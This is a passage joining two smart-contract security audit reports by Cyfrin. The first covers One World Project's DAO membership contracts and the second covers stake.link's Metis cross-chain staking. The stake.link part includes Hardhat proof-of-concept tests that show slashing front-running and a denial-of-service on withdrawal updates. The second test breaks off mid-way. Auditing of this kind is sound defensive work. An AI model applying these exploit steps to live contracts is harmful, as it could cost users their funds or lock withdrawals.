### `chainId` is used as the `EIP712Base::EIP712Domain.salt` in `DOMAIN_TYPEHASH`

**Description:** `EIP712Base` implements EIP-712; however, there is a mistake in the definition of [`DOMAIN_TYPEHASH`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/meta-transaction/EIP712Base.sol#L38) where `chainId` is used as the `salt` parameter.

According to the [EIP-712 specification](https://eips.ethereum.org/EIPS/eip-712#definition-of-domainseparator), the salt should only be used in the `DOMAN_TYPEHASH` as a last resort.

The `chainId` parameter should be used, but rather as a raw chain identifier as done in the OpenZeppelin [EIP-712](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/EIP712.sol#L37-L39) implementation:

```solidity
bytes32 private constant TYPE_HASH =
    keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
```

Consider changing the `DOMAIN_TYPEHASH` to use `chainId` instead of `salt`, or use the OpenZeppelin library directly.

**One World Project:** Intentional. Kept as it is.

**Cyfrin:** Acknowledged.


### Tier indexing is confusing

**Description:** Throughout `MembershipERC1155`, the [highest tier](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L169-L175) membership is referred to with the lowest tier index. To consider an example, for a DAO with `6` tiers, the lowest index `0` should be passed to mint the highest tier membership while the highest index `6` should be passed to mint the lowest tier membership.

This is very confusing and can cause issues for users or third-party integrations. Consider reversing this convention such that the highest tier index corresponds to the highest tier membership, and vice versa.

**One World Project:** Intentional. Tier 0 (Tier 1 in website) is at the highest level. Tier 6 (Tier 7 in website) is lowest.

**Cyfrin:** Acknowledged.


### `MembershipFactory::tiers` will almost always return incorrect state

**Description:** [`MembershipFactory::tiers`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L45-L50) exposes the [`_tiers`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L23) mapping for external consumption, containing specifically the important [`minted`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/libraries/MembershipDAOStructs.sol#L35) state member that indicates how many membership tokens have been minted for a given tier; however, it is not updated in either `MembershipFactory::joinDAO`, unlike the [parallel data structure](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L128), or `MembershipFactory::upgradeTier`, where both state updates are missing. This means that only the [initial configuration state](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L85) will be returned, unless a call is made to `MembershipFactory::updateDAOMembership` in which case the the mappings for a given DAO are [synchronized](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L114). Again, this will only be correct until another membership is minted, after which the actual number of tokens minted for a given tier will exceed that stored in the mapping.

**Recommended Mitigation:** Consider updating both parallel data structures appropriately. Assuming other state update issues are fixed, the [`daos`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L22) mapping could be used to return the correct state; however, this would require either modifying `MembershipFactory::tiers` to return the `daos.tiers` array or implementing a separate call to query a specific array as the public mapping will not return it by default when simply querying `daos()`. In this case, the `_tiers` mapping is redundant and can be completely removed.

**One World Project:** Removed in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. `_tiers` is removed and `MembershipFactory::tiers` now returns the `dao.tiers` array.


### The Beacon proxy pattern is better suited to upgrading multiple instances of `MembershipERC1155`

**Description:** Currently, new membership DAOs are deployed as [Transparent upgradeable proxies](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L66-L70), managed by a [single instance](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L40) of `ProxyAdmin` [exposed](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L155-L163) to the privileged `EXTERNAL_CALLER` role. Assuming that the intention is to upgrade all DAO proxies in the event the `MembershipERC1155` implementation requires updating, it will be cumbersome to iterate through each contract to perform the upgrade. The [Beacon proxy pattern](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/beacon/BeaconProxy.sol) is better-suited to performing this type of global implementation upgrade for all managed proxies and thus recommended over the existing design.

**One World Project:** The Upgrades will be choices for each DAO separately. So kept as it is.

**Cyfrin:** Acknowledged.


### DAO creators cannot freely update membership configuration

**Description:** While `MembershipFactory::updateDAOMembership` is intended to update the tier configurations for a specific DAO, this function can only be called by the [permissioned](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L95) `EXTERNAL_CALLER` role. As such, DAO creators cannot freely update membership configuration without coordination of the `EXTERNAL_CALLER` role.

**Recommended Mitigation:** Allow DAO creators to freely update the membership configuration for their DAOs.

**One World Project:** DAO creators are not supposed to have that access directly.

**Cyfrin:** Acknowledged.


### EIP-712 name and project symbol are misaligned

**Description:** The [symbol](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L69) used for the `MembershipERC1155` token is `1WP`; however, `OWP` is used in the EIP-712 [name declaration](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/meta-transaction/NativeMetaTransaction.sol#L31).

This misalignment could be confusing for users signing messages thinking they are going to use `1WP` as the name. Consider using the same name as symbol, or vice versa.

**One World Project:** Made it OWP in [`ba3603a`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/ba3603ad8c4d976bdf1fa76ea3fb91e8ea1d4462).

**Cyfrin:** Verified. Token symbol is now `OWP`.


### `OWPIdentity` token lacks a `name` and `symbol`

**Description:** While `name` and `symbol` are not mandatory in the ERC-1155 specification, they are often used to identify the token; however, the [`OWPIdentity`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/OWPIdentity.sol) contract does not declare these.

**Recommended Mitigation:** Consider adding a `name` and `symbol` for easier identification.

**One World Project:** Added in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. `name` and `symbol` are added as `public`.


### DAOs can be created with non-zero `TierConfig::minted`

**Description:** When creating a new DAO membership, there is no validation on the `minted` member of the parallel `TierConfig` structs, meaning that DAOs can be created with non-zero minted tokens even when the supply for a given tier index is actually zero.

**Recommended Mitigation:** Consider enforcing that tier configuration minted states should begin empty.

**One World Project:** Added check in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. Check added when pushing the tiers to `dao.tiers`.


### `MembershipFactory::joinDAO` will not function correctly with fee-on-transfer tokens

**Description:** While it is understood that the protocol does not intend to support fee-on-transfer tokens, it is prescient to note that `MembershipFactory::joinDAO` will [not function correctly](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L129-L130) if tokens of this type are ever added to the `CurrencyManager`:

```solidity
IERC20(daos[daoMembershipAddress].currency).transferFrom(msg.sender, owpWallet, platformFees);
IERC20(daos[daoMembershipAddress].currency).transferFrom(msg.sender, daoMembershipAddress, tierPrice - platformFees);
```

Here, the actual number of tokens received by `owpWallet` and `daoMembershipAddress` will be less than expected.

**One World Project:** Acknowledged. Fee on transfer tokens are not supported.

**Cyfrin:** Acknowledged.


### Constants should be used in place of magic numbers

**Description:** There are a number of instances in both `MembershipFactory` [[1](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L60), [2](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L63
), [3](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L97)] and `MembershipERC1155` [[1](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L58), [2](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L71), [3](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L77), [4](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L92), [5](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L168-L175)] where magic numbers are used inline within functions  these should be replaced by constant variables for better readability, to avoid repetition, and to reduce the likelihood of error.

**One World Project:** Added constants at some places where repetitive usage in [`09b6f0f`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/09b6f0f978d2a8d2952a6938bf5756bec8a0170d).

**Cyfrin:** Verified. However only the suggested changes in `MembershipFactory` were implemented, not in `MembershipERC1155`.

\clearpage
## Gas Optimization


### The `savedProfit` mapping will always return zero

**Description:** When a DAO member calls [`MembershipERC1155::claimProfit`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L138-L147), their current profit is calculated in []([`MembershipERC1155::saveProfit`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L178-187):)

```solidity
function saveProfit(address account, address currency) internal returns (uint profit) {
    uint unsaved = getUnsaved(account, currency);
    lastProfit[account][currency] = totalProfit[currency];
    profit = savedProfit[account][currency] + unsaved;
    savedProfit[account][currency] = profit;
}
```

Here, `savedProfit` is incremented by the calculated unsaved profit. The profit is then paid in `MembershipERC1155::claimProfit` after resetting `savedProfit` to zero:

```solidity
function claimProfit(address currency) external returns (uint profit) {
    profit = saveProfit(msg.sender, currency);
    require(profit > 0, "No profit available");
    savedProfit[msg.sender][currency] = 0;
    IERC20(currency).safeTransfer(msg.sender, profit);
    emit Claim(msg.sender, profit);
}
```

Since `savedProfit` is reset to zero within the lifetime of the same call in which it is initialized, the mapping will always return `0` for a given currency/member pair. Thus, usage in the `savedProfit[account][currency] + unsaved` [expression](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L185) is redundant, meaning the value stored in `savedProfit` is never used and can be safely removed.

**Recommended Mitigation:** Consider removing `savedProfit`.

**One World Project:** Updated usage for savedProfit mapping in [`a3980c1`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/a3980c17217a0b65ecbd28eb078d4d94b4bd5b80)

**Cyfrin:** Closed. `savedProfit` now used.

\clearpage

------ FILE END car/reports_md/2024-10-29-cyfrin-one-world-project-v2.0.md ------


------ FILE START car/reports_md/2024-11-18-cyfrin-stake.link-metis-staking-v2.0.md ------

**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

[Hans](https://twitter.com/hansfriese)

**Assisting Auditors**



---

# Findings
## High Risk


### L1 CCIP messages use incorrect `tokensInTransitToL1` value leading to overvalued LST on Metis

**Description:** A discrepancy in withdrawal accounting between L1 and L2 chains can lead to an artificial inflation of the share price in the staking system.

In the `L1Transmitter::_executeUpdate` function, note that while actual amount withdrawn from `L1Strategy`is `toWithdraw`, the CCIP message assumes that the full `queuedWithdrawals` is withdrawn. In the scenario where `queuedWithdrawals > canWithdraw`, the CCIP message is sending an inflated value for `tokensInTransitToL1`

```solidity
//L1Transmitter.sol
function _executeUpdate() private {
    // ...
    uint256 toWithdraw = queuedWithdrawals > canWithdraw ? canWithdraw : queuedWithdrawals;
    if (toWithdraw > minWithdrawalThreshold) { //@audit only when amount > min withdrawal
        l1Strategy.withdraw(toWithdraw); //@audit actual amount withdrawn is toWithdraw
        // ... (withdrawal logic)
    }

    Client.EVM2AnyMessage memory evm2AnyMessage = _buildCCIPUpdateMessage(
        totalDeposits,
        claimedRewards + queuedWithdrawals,  // @audit This uses full queuedWithdrawals, not actual withdrawn amount
        depositsSinceLastUpdate,
        opRewardReceivers,
        opRewardAmounts
    );
    // ...
}
```


In L2Transmitter.sol, the inflated withdrawal amount (`tokensInTransitFromL1`) is accepted without validation:

```solidity
//L2Transmitter.sol
function _ccipReceive(Client.Any2EVMMessage memory _message) internal override {
    // ...
    (
        uint256 totalDeposits,
        uint256 tokensInTransitFromL1,
        uint256 tokensReceivedAtL1,
        address[] memory opRewardReceivers,
        uint256[] memory opRewardAmounts
    ) = abi.decode(_message.data, (uint256, uint256, uint256, address[], uint256[]));

    l2Strategy.handleUpdateFromL1(
        totalDeposits,
        tokensInTransitFromL1,  //@audit This value could be inflated
        tokensReceivedAtL1,
        opRewardReceivers,
        opRewardAmounts
    );
    // ...
}
```

3. In L2Strategy.sol, the inflated tokensInTransitFromL1 inflates deposit change calculations:
```solidity
function getDepositChange() public view returns (int) {
    return
        int256(
            l1TotalDeposits +
                tokensInTransitToL1 +
                tokensInTransitFromL1 +  //@audit This value could be inflated
                token.balanceOf(address(this))
        ) - int256(totalDeposits);
}
```
4. Finally, in StakingPool.sol, the inflated deposit change leads to an artificial increase in totalRewards and share price:
```solidity
function _updateStrategyRewards(uint256[] memory _strategyIdxs, bytes memory _data) private {
    int256 totalRewards;
    // ...
    for (uint256 i = 0; i < _strategyIdxs.length; ++i) {
        IStrategy strategy = IStrategy(strategies[_strategyIdxs[i]]);
        (int256 depositChange, , ) = strategy.updateDeposits(_data);
        totalRewards += depositChange;
    }

    if (totalRewards != 0) {
        totalStaked = uint256(int256(totalStaked) + totalRewards);
    }
    // ...
}
```


**Impact:** This vulnerability leads to an inflate share price of the liquid staking token.

**Recommended Mitigation:** Ensure accurate tracking of actual withdrawn amounts on L1:

```solidity
uint256 actualWithdrawn = 0;
if (toWithdraw > minWithdrawalThreshold) {
    l1Strategy.withdraw(toWithdraw);
    actualWithdrawn = toWithdraw;
    // ... (rest of withdrawal logic)
}
```
Use the actual withdrawn amount in the CCIP message to L2:
```solidity
Client.EVM2AnyMessage memory evm2AnyMessage = _buildCCIPUpdateMessage(
    totalDeposits,
    claimedRewards + actualWithdrawn,
    depositsSinceLastUpdate,
    opRewardReceivers,
    opRewardAmounts
);
```

**Stake.Link:** Fixed in [6a42a8c](https://github.com/stakedotlink/contracts/commit/6a42a8c5d461422333eba1eed8cd57c560603ab7).

**Cyfrin:** Verified.


### Slashing loss redistribution vulnerability allows existing depositors to avoid losses at new depositors' expense

**Description:** The protocol's staking system spans L1 (Ethereum) and L2 (Metis) with state updates propagated via Chainlink CCIP. Current design is exposed to timing vulnerability where slashing events on Metis are not immediately reflected in the share price calculation on L2, allowing earlier depositors to exit at inflated share prices at the expense of new depositors.

The core issue stems from L2Strategy's total deposits calculation which depends on stale L1 state until a CCIP update is received:

```solidity
// L2Strategy.sol
function getTotalDeposits() public view override returns (uint256) {
    return l1TotalDeposits + tokensInTransitToL1 + tokensInTransitFromL1 + token.balanceOf(address(this));
}
```
When slashing occurs on Metis, it's visible in L1Strategy.getDepositChange() but not reflected in totalDeposits until updateDeposits is called via CCIP:

```solidity
// L1Strategy.sol
function getDepositChange() public view returns (int) {
    uint256 totalBalance = token.balanceOf(address(this));
    for (uint256 i = 0; i < vaults.length; ++i) {
        totalBalance += vaults[i].getTotalDeposits();
    }
    return int(totalBalance) - int(totalDeposits);
}
```
This can lead to a potential scenario that spans as follows:

-> Slashing occurs on Metis and is visible in L1Strategy.getDepositChange()
-> New deposits on L2 receive shares at an inflated price (using stale L1 state)
-> Earlier depositors can withdraw using this new liquidity at pre-slash value
-> When the slash is finally reflected via CCIP, the last depositor bears most of the loss

**Impact:**
- New depositors could get fewer shares than they should even if they deposited after slashing on L1
- Front-running slashing can allow old depositors to exit using liquidity created by new depositors. As a result, a disproportionate slashing impact falls on recent depositors.

**Proof of Concept:** Run the following test. For this test, `allowInstantWithdrawals` is set to `true` on PriorityPool.

```solidity
  it('front running on metis', async () => {
    const {
      signers,
      accounts,
      l2Strategy,
      l2Metistoken,
      l2Transmitter,
      stakingPool,
      priorityPool,
      metisLockingInfo,
      metisLockingPool,
      l1Metistoken,
      l1Transmitter,
      l1Strategy,
      vaults,
      offRamp,
    } = await loadFixture(deployFixture)

    // // setup Bob and Alice
    const bob = signers[7]
    const bobAddress = accounts[7]
    const alice = signers[8]
    const aliceAddress = accounts[8]
    const initialDeposit = toEther(1000)

    await l2Metistoken.transfer(bobAddress, initialDeposit)
    await l2Metistoken.connect(bob).approve(priorityPool.target, ethers.MaxUint256)
    await stakingPool.connect(bob).approve(priorityPool.target, ethers.MaxUint256)

    // Bob makes initial deposit
    await priorityPool.connect(bob).deposit(initialDeposit, false, ['0x'])
    assert.equal(await fromEther(await l2Strategy.getTotalDeposits()), fromEther(initialDeposit))
    assert.equal(
      await fromEther(await l2Strategy.getTotalQueuedTokens()),
      fromEther(initialDeposit)
    )

    // executeUpdate to send message and tokens to L1
    await l2Transmitter.executeUpdate({ value: toEther(10) })
    assert.equal(await fromEther(await l2Strategy.getTotalDeposits()), fromEther(initialDeposit))
    assert.equal(await fromEther(await l2Strategy.getTotalQueuedTokens()), 0)
    assert.equal(await fromEther(await l2Metistoken.balanceOf(l2Strategy.target)), 0)
    assert.equal(await fromEther(await l2Strategy.tokensInTransitToL1()), fromEther(initialDeposit))

    // deposit the tokens received form L2 in L1
    await l1Metistoken.transfer(l1Transmitter.target, initialDeposit) // mock the deposit via L2 Bridge
    await l1Transmitter.depositTokensFromL2() // deposits balance into L1 Strategy
    await l1Transmitter.depositQueuedTokens([1], [initialDeposit]) // deposits balance into vault 1

    let vault1 = await ethers.getContractAt('SequencerVault', (await l1Strategy.getVaults())[1])
    assert.equal(await fromEther(await vault1.getPrincipalDeposits()), fromEther(initialDeposit))

    // Confirm initial deposit via CCIP back to L2
    await offRamp
      .connect(signers[5])
      .executeSingleMessage(
        ethers.encodeBytes32String('messageId'),
        777,
        ethers.AbiCoder.defaultAbiCoder().encode(
          ['uint256', 'uint256', 'uint256', 'address[]', 'uint256[]'],
          [initialDeposit, 0, initialDeposit, [], []]
        ),
        l2Transmitter.target,
        []
      )

    assert.equal(fromEther(await l2Strategy.l1TotalDeposits()), fromEther(initialDeposit))
    assert.equal(fromEther(await l2Strategy.tokensInTransitFromL1()), 0)
    assert.equal(fromEther(await l2Strategy.tokensInTransitToL1()), 0)
    assert.equal(fromEther(await l2Strategy.getTotalDeposits()), fromEther(initialDeposit))
    assert.equal(fromEther(await stakingPool.totalStaked()), fromEther(initialDeposit))

    assert.equal(fromEther(await stakingPool.balanceOf(bobAddress)), fromEther(initialDeposit))

    // simulate 20% slashing on Metis
    const slashAmount = toEther(200) // 20% of 1000
    await metisLockingPool.slashPrincipal(1, slashAmount)

    assert.equal(fromEther(await l1Strategy.getDepositChange()), -200)

    // At this point share price should still reflect 1000 tokens since slash isn't reflected
    // Alice deposits after slash but before it's reflected
    const aliceDeposit = toEther(1000)
    await l2Metistoken.transfer(alice.address, aliceDeposit)
    await l2Metistoken.connect(alice).approve(priorityPool.target, ethers.MaxUint256)
    await stakingPool.connect(alice).approve(priorityPool.target, ethers.MaxUint256)

    // Alice deposits at inflated share price
    await priorityPool.connect(alice).deposit(aliceDeposit, false, ['0x'])

    assert.equal(
      fromEther(await stakingPool.totalStaked()),
      fromEther(initialDeposit) + fromEther(aliceDeposit)
    )

    assert.equal(
      fromEther(await l2Strategy.getTotalDeposits()),
      fromEther(initialDeposit) + fromEther(aliceDeposit)
    )
    assert.equal(fromEther(await stakingPool.balanceOf(aliceAddress)), fromEther(aliceDeposit)) //1:1 conversion even though there is slashing
    assert.equal(fromEther(await l2Strategy.getTotalQueuedTokens()), fromEther(aliceDeposit))
    assert.equal(
      fromEther(await l2Metistoken.balanceOf(l2Strategy.target)),
      fromEther(aliceDeposit)
    )

    // Bob sees the slashing on L2 and places a withdrawal request
    const bobBalanceBefore = await l2Metistoken.balanceOf(bobAddress)
    const bobWithdrawAmount = await stakingPool.balanceOf(bobAddress) // try to redeem all of Bob's shares for metis token

    await priorityPool.connect(bob).withdraw(
      bobWithdrawAmount,
      0,
      0,
      [],
      false,
      false, // Don't queue, withdraw instantly from available liquidity
      ['0x']
    )

    // Process Bob's withdrawal using Alice's new deposits
    const bobBalanceAfter = await l2Metistoken.balanceOf(bob.address)
    assert.equal(fromEther(bobBalanceAfter - bobBalanceBefore), fromEther(bobWithdrawAmount)) //full withdrawal even after slashing

    // Finally CCIP message arrives reflecting the slash
    await offRamp.connect(signers[5]).executeSingleMessage(
      ethers.encodeBytes32String('messageId2'),
      777,
      ethers.AbiCoder.defaultAbiCoder().encode(
        ['uint256', 'uint256', 'uint256', 'address[]', 'uint256[]'],
        [toEther(800), 0, 0, [], []] // Now reflects the slash
      ),
      l2Transmitter.target,
      []
    )

    // Calculate Alice's actual value vs expected
    const aliceShareBalance = fromEther(await stakingPool.sharesOf(alice.address))
    const aliceCurrentValueOfShares = fromEther(await stakingPool.balanceOf(alice.address))
    assert.equal(aliceShareBalance, 1000)
    assert.equal(aliceCurrentValueOfShares, 800)
  })
```

**Recommended Mitigation:** Consider the following recommendations:
- Disallow instant withdrawals on PriorityPool for the L2Strategy.
- Add a new owner controlled boolean state variable called `slashed`. Owner updates this variable to true as soon as slashing event occurs and resets it back to `false` once CCIP update is received on L2. When `slashed= true`, prevent all deposits and withdrawals on the strategy until the CCIP update by overriding the `canDeposit` and `canWithdraw` functions in `L2Strategy` as follows:

```solidity
  // @audit override in L2Strategy.sol
  function canWithdraw() public view override returns (uint256) {
        if(slashed) return 0; //@audit prevent withdrawals until slashing is updated on L2
        super.canWithdraw()
    }

    function canDeposit() public view override returns (uint256) {
        if(slashed) return 0; //@audit prevent deposits until slashing is updated on L2
        super.canDeposit()
    }
```

**Stake.Link**
Acknowleged.  We will use the PriorityPool.sol pausing logic as soon as a slash is detected.

**Cyfrin**
Acknowledged. Our recommendation was at a "strategy" level whereas the proposed mitigation is at a "pool" level. In case of multiple strategies, it is note worthy that the proposed mitigation will pause deposits across all strategies.


### Attacker can manipulate queued withdrawal execution timing on withdrawal pool to prevent withdrawals on L1 indefinitely

**Description:** The protocol's `L2Transmitter::executeUpdate` function can be blocked through manipulation of withdrawal timing controls. The vulnerability exists due to a lack of access control on `WithdrawalPool::performUpkeep` combined with shared timing restrictions between withdrawals and L2 transmitter updates.

The key issue stems from the interaction between these functions:
```solidity
// L2Transmitter.sol
function executeQueuedWithdrawals() public {
        uint256 queuedTokens = l2Strategy.getTotalQueuedTokens();
        uint256 queuedWithdrawals = withdrawalPool.getTotalQueuedWithdrawals();
        uint256 toWithdraw = MathUpgradeable.min(queuedTokens, queuedWithdrawals);

        if (toWithdraw == 0) revert CannotExecuteWithdrawals();

        bytes[] memory args = new bytes[](1);
        args[0] = "0x";
        withdrawalPool.performUpkeep(abi.encode(args)); //@audit attacker can front-run this to block execute update
    }

function executeUpdate() external payable {
    if (block.timestamp < timeOfLastUpdate + minTimeBetweenUpdates) { //@audit can only run this once every minTimeBetweenUpdates
        revert InsufficientTimeElapsed();
    }

    if (queuedTokens != 0 && queuedWithdrawals != 0) {
        executeQueuedWithdrawals();  // This calls WithdrawalPool.performUpkeep()
        queuedTokens = l2Strategy.getTotalQueuedTokens();
        queuedWithdrawals = withdrawalPool.getTotalQueuedWithdrawals();
    }
    // ... CCIP processing ...
}

// WithdrawalPool.sol
function performUpkeep(bytes calldata _performData) external {
    uint256 canWithdraw = priorityPool.canWithdraw(address(this), 0);
    uint256 totalQueued = _getStakeByShares(totalQueuedShareWithdrawals);
    if (
        totalQueued == 0 ||
        canWithdraw == 0 ||
        block.timestamp <= timeOfLastWithdrawal + minTimeBetweenWithdrawals
    ) revert NoUpkeepNeeded();

    timeOfLastWithdrawal = uint64(block.timestamp);
    // ... withdrawal processing ...
}
```

An attacker can block `L2Transmitter::executeUpdate` by doing the following:

-> Wait for `minTimeBetweenWithdrawals` to elapse
-> Call `L2Transmitter::executeQueuedWithdrawals()` right after time elapses
-> If `queuedWithdrawals` becomes 0: Queue a minimum withdrawal to restore `queuedWithdrawals > 0`

Eventually when `L2Transmitter::executeUpdate` is called, it will try to process withdrawals via `executeQueuedWithdrawals` since `queuedTokens` and `queuedWithdrawals` are both non-zero. This fails because `minTimeBetweenWithdrawals` has not elapsed causing the entire `executeUpdate` to revert.


**Impact:** This attack can be repeated to continuously prevent CCIP updates from being processed. This can potentially prevent withdrawals on L1 indefinitely.

**Proof of Concept:** Run the following POC, with `minTimeBetweenWithdrawals` for withdrawal pool as 50,000 and `minTimeBetweenUpdates` for L2Transmitter as 86400. Also, set `allowInstantWithdrawals` to false in PriorityPool.

```solidity
  it('DOS executeUpdate on L1Transmitter', async () => {
    const {
      signers,
      accounts,
      l2Strategy,
      l2Metistoken,
      l2Transmitter,
      stakingPool,
      priorityPool,
      withdrawalPool,
      offRamp,
    } = await loadFixture(deployFixture)

    // // setup Bob and Alice
    const bob = signers[7]
    const bobAddress = accounts[7]
    const alice = signers[8]
    const aliceAddress = accounts[8]

    // 1.0 Fund Alice and Bob token and give necessary approvals
    await l2Metistoken.transfer(bobAddress, toEther(100))
    await l2Metistoken.connect(bob).approve(priorityPool.target, ethers.MaxUint256)
    await stakingPool.connect(bob).approve(priorityPool.target, ethers.MaxUint256)

    await l2Metistoken.transfer(aliceAddress, toEther(100))
    await l2Metistoken.connect(alice).approve(priorityPool.target, ethers.MaxUint256)
    await stakingPool.connect(alice).approve(priorityPool.target, ethers.MaxUint256)

    // 2.0 Bob deposits 50 METIS and calls executeUpdate on L2Transmitter
    await priorityPool.connect(bob).deposit(toEther(50), false, ['0x'])
    assert.equal(fromEther(await l2Strategy.getTotalDeposits()), 50)
    assert.equal(fromEther(await l2Strategy.getTotalQueuedTokens()), 50)

    await l2Transmitter.executeUpdate({ value: toEther(10) })

    assert.equal(fromEther(await l2Strategy.getTotalDeposits()), 50)
    assert.equal(fromEther(await l2Strategy.tokensInTransitToL1()), 50)

    // 3.0 Assume tokens are invested in sequencer vaults on L1 and a message is returned
    await offRamp
      .connect(signers[5]) //@note executes message on L2
      .executeSingleMessage(
        ethers.encodeBytes32String('messageId'),
        777,
        ethers.AbiCoder.defaultAbiCoder().encode(
          ['uint256', 'uint256', 'uint256', 'address[]', 'uint256[]'],
          [toEther(50), 0, toEther(50), [], []]
        ),
        l2Transmitter.target,
        []
      )
    assert.equal(fromEther(await l2Strategy.getTotalDeposits()), 50)
    assert.equal(fromEther(await l2Strategy.tokensInTransitToL1()), 0)
    assert.equal(fromEther(await l2Strategy.tokensInTransitFromL1()), 0)
    assert.equal(fromEther(await l2Strategy.l1TotalDeposits()), 50)

    // 4.0 At this point Alice deposits 25 metis
    await priorityPool.connect(alice).deposit(toEther(25), false, ['0x'])

    assert.equal(fromEther(await l2Strategy.getTotalDeposits()), 75)
    assert.equal(fromEther(await l2Strategy.getTotalQueuedTokens()), 25)
    assert.equal(fromEther(await l2Metistoken.balanceOf(l2Strategy.target)), 25)

    // 5.0 Right before executeUpdate is called on L2Transmitter, Bob withdraws 10 metis
    await priorityPool.connect(bob).withdraw(
      toEther(10),
      0,
      0,
      [],
      false,
      true, // queue withdrawal
      ['0x']
    )

    assert.equal(fromEther(await withdrawalPool.getTotalQueuedWithdrawals()), 10)

    // 6.0 Bob then calls executeQueuedWithdrawals
    await time.increase(50001) // 50000 seconds is min time between withdrawals
    await l2Transmitter.executeQueuedWithdrawals()

    // At this point queued withdrawals is 5, queued tokens is 0
    assert.equal(fromEther(await l2Strategy.getTotalQueuedTokens()), 15)
    assert.equal(fromEther(await withdrawalPool.getTotalQueuedWithdrawals()), 0)

    // // 7.0 Bob again places a 10 metis withdrawal
    await priorityPool.connect(bob).withdraw(
      toEther(10),
      0,
      0,
      [],
      false,
      true, // queue withdrawal
      ['0x']
    )
    assert.equal(fromEther(await l2Strategy.getTotalQueuedTokens()), 15)
    assert.equal(fromEther(await withdrawalPool.getTotalQueuedWithdrawals()), 10)

    await time.increase(36401) // 50001 + 36401 > 86400. So from the initial time, we are now 86401 seconds
    // we should be able to again run execute update

